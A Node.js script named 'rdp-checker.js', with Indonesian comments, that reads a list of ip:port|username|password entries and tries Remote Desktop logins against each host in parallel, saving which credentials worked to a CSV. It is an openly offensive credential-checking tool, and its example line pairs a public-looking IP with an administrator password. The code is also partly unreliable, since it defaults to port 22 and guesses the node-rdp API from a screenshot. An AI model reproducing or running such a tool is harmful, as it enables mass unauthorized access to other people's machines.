// rdp-checker.js
// Usage: node rdp-checker.js targets.txt
// Format each line in targets.txt: ip:port|username|password
// Example line: 178.128.125.101:3389|administrator|Bakso123

const fs = require('fs');
const path = require('path');
const rdpModule = require('node-rdp'); // sesuai screenshot
const os = require('os');

if (process.argv.length < 3) {
  console.error('Usage: node rdp-checker.js targets.txt');
  process.exit(1);
}

const inputFile = process.argv[2];
if (!fs.existsSync(inputFile)) {
  console.error('Input file not found:', inputFile);
  process.exit(2);
}

const CONCURRENCY = 6;       // jumlah koneksi paralel, sesuaikan
const TIMEOUT_MS = 20_000;   // timeout per koneksi (ms)
const OUT_CSV = 'results.csv';

function parseLine(line) {
  // expecting ip:port|username|password
  const trimmed = line.trim();
  if (!trimmed) return null;
  const parts = trimmed.split('|').map(s => s.trim());
  if (parts.length !== 3) return null;
  const [addr, username, password] = parts;
  return { addr, username, password };
}

function timeoutPromise(p, ms) {
  return Promise.race([
    p,
    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))
  ]);
}

async function tryRdp({ addr, username, password }) {
  // addr: "ip:port" or just "ip" (default port handling outside)
  // Build options object similar to screenshot
  const [host, maybePort] = addr.split(':');
  const port = maybePort ? parseInt(maybePort, 10) : 22;

  const options = {
    address: `${host}:${port}`,
    username,
    password,
    safeMode: true,   // sesuai screenshot; bisa diubah
    // tambah opsi lain jika module mendukung (domain, screen, etc)
  };

  // The node-rdp API in your screenshot shows rdp(options).then(function(deferred){ ... })
  // We'll attempt to treat rdpModule as a function returning a Promise.
  try {
    const start = Date.now();
    // wrap in timeout
    await timeoutPromise(
      new Promise((resolve, reject) => {
        // call module; adapt if module API is different
        // many node modules return a Promise directly, others use callback.
        // try treating it as promise-based:
        let called = false;
        try {
          const p = rdpModule(options);
          if (p && typeof p.then === 'function') {
            p.then(() => resolve()).catch(err => reject(err));
          } else {
            // fallback: if module expects callbacks or returns deferred,
            // try to detect 'then' on returned object or wait short then resolve.
            // (If API differs, adapt here.)
            setTimeout(() => {
              // if we get here, assume connected (risky) — but better to throw
              reject(new Error('node-rdp did not return a promise — adapt API'));
            }, 2000);
          }
        } catch (err) {
          reject(err);
        }
      }),
      TIMEOUT_MS
    );
    return { status: 'success', addr, username, time_ms: Date.now() - start, err: '' };
  } catch (err) {
    return { status: 'fail', addr, username, time_ms: null, err: err.message || String(err) };
  }
}

// simple concurrency worker pool
async function runAll(tasks, concurrency) {
  const results = [];
  let idx = 0;
  const workers = new Array(concurrency).fill(null).map(async () => {
    while (true) {
      let i;
      // atomic take
      if (idx >= tasks.length) break;
      i = idx++;
      const t = tasks[i];
      try {
        const res = await tryRdp(t);
        results[i] = res;
        console.log(`[${i+1}/${tasks.length}] ${t.addr} -> ${res.status} ${res.err ? ' : '+res.err : ''}`);
      } catch (err) {
        results[i] = { status: 'error', addr: t.addr, username: t.username, time_ms: null, err: err.message };
        console.log(`[${i+1}/${tasks.length}] ${t.addr} -> error: ${err.message}`);
      }
      // tiny delay to avoid burst
      await new Promise(r => setTimeout(r, 50));
    }
  });
  await Promise.all(workers);
  return results;
}

(async () => {
  const lines = fs.readFileSync(inputFile, 'utf8').split(/\r?\n/);
  const tasks = lines.map(parseLine).filter(Boolean);
  if (!tasks.length) {
    console.error('No valid targets parsed.');
    process.exit(3);
  }

  console.log(`Starting RDP check for ${tasks.length} targets (concurrency=${CONCURRENCY})`);
  const results = await runAll(tasks, CONCURRENCY);

  // write CSV
  const header = 'addr,username,status,time_ms,error' + os.EOL;
  const rows = results.map(r => {
    return [
      `"${r.addr}"`,
      `"${r.username}"`,
      `"${r.status}"`,
      `${r.time_ms === null ? '' : r.time_ms}`,
      `"${(r.err||'').replace(/"/g, '""')}"`
    ].join(',');
  }).join(os.EOL);
  fs.writeFileSync(OUT_CSV, header + rows, 'utf8');
  console.log('Done. Results saved to', OUT_CSV);
})();
